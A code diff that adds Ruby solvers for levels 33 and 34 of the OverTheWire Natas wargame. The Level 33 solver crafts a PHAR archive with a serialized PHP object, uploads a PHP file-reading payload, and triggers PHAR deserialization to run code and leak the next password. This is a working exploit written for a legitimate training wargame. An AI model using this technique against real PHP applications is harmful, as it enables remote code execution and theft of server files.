@@ -4,6 +4,7 @@ require 'net/http'
 require 'base64'
 require 'yaml'
 require 'json'
+require 'digest'
 
 ##
 # OverTheWire wargame Natas
@@ -944,4 +945,60 @@ end
 # Level 33
 class NatasLevel33 < NatasLevelBase
   LEVEL = 33
+  PAGE = '/'
+  MAX_FILESIZE = 4096
+  PAYLOAD_FILENAME = 'payload.php'
+  PHAR_FILENAME = 'payload.phar'
+  PHARNAME = 'phar://payload.phar/empty.php'
+  PAYLOAD = %(Password: <?php echo file_get_contents("#{WEBPASS}/natas34"); ?>)
+
+  def exec
+    payload_signature = Digest::MD5.hexdigest(PAYLOAD)
+    log("Payload MD5 signature: #{payload_signature}")
+
+    phar_payload = %(<?php __HALT_COMPILER(); ?>\r\n\xD4\x00\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00\x9D\x00\x00\x00O:8:\"Executor\":3:{s:18:\"\x00Executor\x00filename\";s:#{PAYLOAD_FILENAME.bytesize}:\"#{PAYLOAD_FILENAME}\";s:19:\"\x00Executor\x00signature\";s:#{payload_signature.bytesize}:\"#{payload_signature}\";s:14:\"\x00Executor\x00init\";b:0;}\t\x00\x00\x00empty.php\x00\x00\x00\x00\x8C\x9CSa\x00\x00\x00\x00\x00\x00\x00\x00\xB4\x01\x00\x00\x00\x00\x00\x00).dup
+    phar_payload.force_encoding('ascii-8bit')
+    phar_signature = Digest::SHA1.digest(phar_payload)
+    log("PHAR SHA1 signature: #{phar_signature.unpack1('H*')}")
+    phar_payload << phar_signature
+    phar_payload << "\x02\x00\x00\x00GBMB"
+
+    log("Uploading file with payload: #{PAYLOAD_FILENAME}")
+    data = [
+      ['filename', PAYLOAD_FILENAME],
+      ['uploadedfile', PAYLOAD, { filename: 'uploadedfile' }]
+    ]
+    post(PAGE, {}, data, multipart: true)
+
+    log("Uploading file with PHAR payload: #{PHAR_FILENAME}")
+    data = [
+      ['filename', PHAR_FILENAME],
+      ['uploadedfile', phar_payload, { filename: 'uploadedfile' }]
+    ]
+    post(PAGE, {}, data, multipart: true)
+
+    log("Executing PHAR payload: #{PHARNAME}")
+    data = [
+      ['filename', PHARNAME],
+      ['uploadedfile', "\x00" * (MAX_FILESIZE + 1), { filename: 'uploadedfile' }]
+    ]
+    data = post(PAGE, {}, data, multipart: true).body
+
+    match = /Password: (\w+)/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 34
+class NatasLevel34 < NatasLevelBase
+  LEVEL = 34
+  PAGE = '/'
+
+  def exec
+    data = get(PAGE).body
+    match = %r{<div id="content">\n(.+)\n</div>}.match(data)
+    not_found unless match
+    log(match[1])
+  end
 end
